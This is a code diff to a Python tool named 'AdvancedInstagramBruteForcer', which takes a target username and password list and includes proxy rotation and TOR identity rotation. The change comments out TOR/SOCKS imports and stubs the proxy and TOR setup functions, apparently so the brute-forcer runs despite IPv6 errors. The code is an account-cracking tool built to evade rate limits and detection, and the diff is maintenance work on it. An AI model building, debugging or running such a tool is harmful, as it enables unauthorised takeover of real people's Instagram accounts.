@@ -44,10 +44,12 @@ except ImportError:
 
 # Additional advanced modules
 try:
-    import socks
-    import stem
-    from stem import Signal
-    from stem.control import Controller
+    # Temporarily disable TOR/SOCKS to avoid IPv6 issues
+    # import socks
+    # import stem
+    # from stem import Signal
+    # from stem.control import Controller
+    socks = stem = Signal = Controller = None
 except ImportError:
     socks = stem = Signal = Controller = None
 
@@ -81,7 +83,8 @@ class AdvancedInstagramBruteForcer:
     def __init__(self, target_username, password_list, proxy_list=None, use_tor=False):
         self.target_username = target_username
         self.password_list = password_list
-        self.proxy_list = self.load_proxies() if not proxy_list else proxy_list
+        # Disable proxy loading to avoid IPv6/PySocks issues
+        self.proxy_list = [] if not proxy_list else proxy_list
         self.found_password = None
         self.use_tor = use_tor
         self.rate_limit_count = 0
@@ -742,12 +745,7 @@ class AdvancedInstagramBruteForcer:
         return self.sessions[0] if self.sessions else requests.Session()
 
     def get_proxy(self):
-        """Get a random proxy"""
-        if self.proxy_list:
-            proxy = random.choice(self.proxy_list)
-            if '://' not in proxy:
-                proxy = f'http://{proxy}'
-            return {'http': proxy, 'https': proxy}
+        """Get a random proxy - disabled to avoid IPv6 issues"""
         return None
 
     def get_network_info(self):
@@ -830,19 +828,8 @@ class AdvancedInstagramBruteForcer:
 
     def setup_tor_connection(self):
         """Setup TOR connection for advanced anonymity"""
-        if not socks or not stem:
-            print("⚠️  TOR modules not available")
-            return False
-
-        try:
-            # Configure SOCKS proxy for TOR
-            socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-            socket.socket = socks.socksocket
-            print("✅ TOR connection established")
-            return True
-        except Exception as e:
-            print(f"⚠️  TOR setup failed: {e}")
-            return False
+        print("⚠️  TOR modules disabled to avoid IPv6 issues")
+        return False
 
     def rotate_tor_identity(self):
         """Rotate TOR identity for new IP"""
